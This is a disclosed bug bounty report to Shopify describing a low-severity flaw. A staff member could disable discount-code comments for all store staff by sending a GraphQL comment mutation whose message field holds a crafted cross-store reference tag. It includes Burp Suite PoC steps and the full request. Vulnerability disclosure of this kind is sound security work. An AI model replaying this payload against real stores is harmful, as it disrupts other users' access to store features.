# any staff members have the ability to comment in [discounts] he/she can disable comment section it to other staff even the admin of the store

## Report Details
- **Report ID**: 629150
- **URL**: https://hackerone.com/reports/629150
- **State**: Closed
- **Severity**: low
- **Submitted**: 2019-06-25T15:35:08.768Z
- **Disclosed**: 2019-07-15T14:20:18.173Z

## Reporter
- **Username**: modam3r5
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
Hi,

I found this cool behavior by mistake when I was testing for some `GraphQL`, any user have ability to comment in `discounts code ` at discounts section can turn off comments to the other staff members include the admin/manager of the store.
this happens because when the `GraphQL` used to create a comment that contains a **Reference page** TAG and this TAG for an another store `Reference page` this will make the request return with an internal error that will affect the conversion on the **discounts code** that will lead to disabled it to everyone on the store include the manager/staff of the store.

#PoC
1. create two staffs `[admin1] - [admin2]` in store.
2. from **admin1** create a discount code and add a comment on it.
3. from **admin2** go to the discount code that had been created, turn-on the `Burpsuite` and add a comment.
4. catch the `GraphQL` request and add this in value of parameter ==message== `[#V12221027811351| ]` and send the request.
5. the response will return with an error like this

```json
{"errors":
[
{"message":"Internal error. Looks like something went wrong on our end.\nRequest ID: d8358e69-631c-45a7-929b-630b9abf8b5c (include this in support requests)."}
]
}
```
now if you refresh the page or going direct to **discount code** link will return with an error like this picture below
{F516543}

and the only way to browser the **discount code** that you had added a comment on it is from `/admin/discounts/` and then click on the **discount code** and it will open without include/show the comment section in the footer of discount code page.

{F516544}

##GraphQL request

```json
{"operationName":"TimelineCommentCreate","variables":{"input":{"message":"[#V12221027811351|  ] ","resourceId":"gid://shopify/PriceRule/298300342294","attachments":[]}},"query":"mutation TimelineCommentCreate($input: TimelineCommentCreateInput!) {\n  timelineCommentCreate(input: $input) {\n    event {\n      ...TimelineEvent\n      __typename\n    }\n    userErrors {\n      field\n      message\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment TimelineEvent on Event {\n  id\n  createdAt\n  message\n  ... on BasicEvent {\n    attributeToApp\n    attributeToUser\n    __typename\n  }\n  ... on CommentEvent {\n    rawMessage\n    edited\n    author {\n      id\n      name\n      initials\n      avatar(fallback: NOT_FOUND) {\n        transformedSrc(maxWidth: 50, maxHeight: 50, scale: 3)\n        __typename\n      }\n      __typename\n    }\n    attachments {\n      id\n      image {\n        transformedSrc(maxWidth: 50, maxHeight: 54, scale: 3)\n        __typename\n      }\n      fileExtension\n      size\n      name\n      url\n      __typename\n    }\n    embed {\n      ... on Product {\n        id\n        title\n        featuredImage {\n          altText\n          transformedSrc(maxWidth: 50, maxHeight: 50, scale: 3)\n          __typename\n        }\n        tracksInventory\n        totalInventory\n        variants(first: 1) {\n          edges {\n            node {\n              price\n              __typename\n            }\n            __typename\n          }\n          __typename\n        }\n        __typename\n      }\n      ... on ProductVariant {\n        id\n        title\n        image {\n          altText\n          transformedSrc(maxWidth: 50, maxHeight: 50, scale: 3)\n          __typename\n        }\n        product {\n          title\n          __typename\n        }\n        inventoryQuantity\n        inventoryItem {\n          tracked\n          __typename\n        }\n        __typename\n      }\n      ... on Customer {\n        id\n        displayName\n        email\n        ordersCount\n        totalSpentV2 {\n          amount\n          currencyCode\n          __typename\n        }\n        phone\n        note\n        __typename\n      }\n      ... on Order {\n        id\n        name\n        createdAt\n        totalPriceSet {\n          shopMoney {\n            amount\n            currencyCode\n            __typename\n          }\n          __typename\n        }\n        customer {\n          id\n          displayName\n          __typename\n        }\n        lineItems(first: 250) {\n          edges {\n            node {\n              id\n              title\n              product {\n                id\n                __typename\n              }\n              variant {\n                id\n                __typename\n              }\n              __typename\n            }\n            __typename\n          }\n          __typename\n        }\n        displayFinancialStatus\n        displayFulfillmentStatus\n        __typename\n      }\n      ... on DraftOrder {\n        id\n        name\n        createdAt\n        totalPrice\n        customer {\n          id\n          displayName\n          __typename\n        }\n        lineItems(first: 250) {\n          edges {\n            node {\n              id\n              title\n              product {\n                id\n                __typename\n              }\n              variant {\n                id\n                __typename\n              }\n              __typename\n            }\n            __typename\n          }\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n"}
```

change the only value of parameter `resourceId` with ID of your **discount code ** that you created in the store. 


##Video
this video explain the behavior in case i missed something in the **PoC** steps

{F516550}

## Impact

this can let any other stuff disabled the comment section on any discount code if he/she has the permission to reach it.

## Attachments
- Screenshot_2019-06-25_Shopify.png
- Screenshot_2019-06-25_modam3r5___Discount_codes___2QTJW7VNT16J___Shopify.png
- shopify_PoC.mp4
